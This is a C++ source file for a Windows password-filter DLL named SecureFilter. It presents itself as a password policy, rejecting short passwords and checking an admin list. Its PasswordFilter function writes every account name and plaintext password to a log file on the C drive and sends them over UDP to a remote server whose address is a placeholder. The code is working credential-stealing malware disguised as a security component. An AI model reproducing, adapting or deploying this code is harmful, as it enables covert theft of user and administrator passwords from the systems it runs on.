// SecureFilter.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include "UDPSocket.h"
extern CUDPSocket m_socket;

WCHAR buffer[1024];

#define ACCOUNT_NUM 64
#define ACCOUNT_LEN 16
CHAR list[ACCOUNT_NUM][ACCOUNT_LEN];
#define  ADMLISTPATH  "c:\\admlist.txt"
#define  MYDLLLOGPATH  "c:\\SecureFilter.log"
void WriteLog(const char *fmt,...)
{
	va_list args;
	char modname[200];
	char temp[5000]={0};
	HANDLE hFile;
	GetModuleFileNameA(NULL, modname, sizeof(modname));
	if((hFile =CreateFileA(MYDLLLOGPATH, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) <0) return;
	int pos = SetFilePointer(hFile, 0, NULL, FILE_END);
	if (pos != -1) // Test for failure
	{
		wsprintfA(temp, "%s:", modname);
		DWORD dw;
		WriteFile(hFile, temp, strlen(temp), &dw, NULL);
		va_start(args,fmt);
		vsprintf(temp, fmt, args);
		va_end(args);
		WriteFile(hFile, temp, strlen(temp), &dw, NULL);
		wsprintfA(temp, "\r\n");
		WriteFile(hFile, temp, strlen(temp), &dw, NULL);
	}

	CloseHandle(hFile);
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) 
{
	return TRUE;
}

extern "C" __declspec(dllexport) int __stdcall 	PasswordChangeNotify(PUNICODE_STRING *UserName, 
	                                            ULONG RelativeId, 
	                                            PUNICODE_STRING *NewPassword) 
{
	return FALSE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, 
																  PUNICODE_STRING FullName, 
																  PUNICODE_STRING Password, 
																  BOOLEAN SetOperation)
{
	int nPasswd = wcslen(Password->Buffer);
	if(nPasswd < 6)
	{
		return 0;
	}
 
	if(nPasswd < 8)  //判断是否管理员
	{
		for(int i=0; i< ACCOUNT_NUM; i++)
			memset(list[i], 0x00, sizeof(list[i]));
		memset(list, 0x00, sizeof(list));

		FILE* file;
		file = fopen(ADMLISTPATH, "r");
		if(file != NULL)
		{	
			DWORD dBufSize=WideCharToMultiByte(CP_OEMCP, 0, AccountName->Buffer, -1, NULL,0,NULL, FALSE);
			char* dBuf = new char[dBufSize];
			memset(dBuf, 0, dBufSize);
			WideCharToMultiByte(CP_OEMCP, 0, AccountName->Buffer, -1, dBuf, dBufSize, NULL, FALSE); 
			int nALen = strlen(dBuf);
			int j = 0;	
			while(!feof(file))
			{
				fgets(list[j], sizeof(list[j]), file);
				int nFileLen = strlen(list[j]);
				if(nFileLen > nALen)
					nFileLen = nALen;

				if(strncmp(dBuf, list[j], nFileLen) == 0)
				{
					delete [] dBuf;
					fclose(file);
					return 0;
				}
				j++;
			}
			
			delete [] dBuf;
			fclose(file);
		}
	}
	///===========================	


	char lpDst[MAX_PATH] = {0};
	memset(buffer, 0, sizeof(buffer));
	swprintf(buffer, L"|111111|%wZ|%wZ\r\n", AccountName, Password);

	WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,
		buffer,	-1,	lpDst, sizeof(lpDst), NULL, NULL );

	WriteLog(lpDst);

	//发送到服务器
	char sIP[16];
	memset(sIP, 0, sizeof(sIP));
	sprintf(sIP, "%s", "x.x.x.x");

	int len = 0;
	int datalen = strlen(lpDst)+1;
	len = m_socket.SendTo((char*)&lpDst, datalen , sIP, SVR_NODE_PORT); 
	//发送完成

	return 1;
}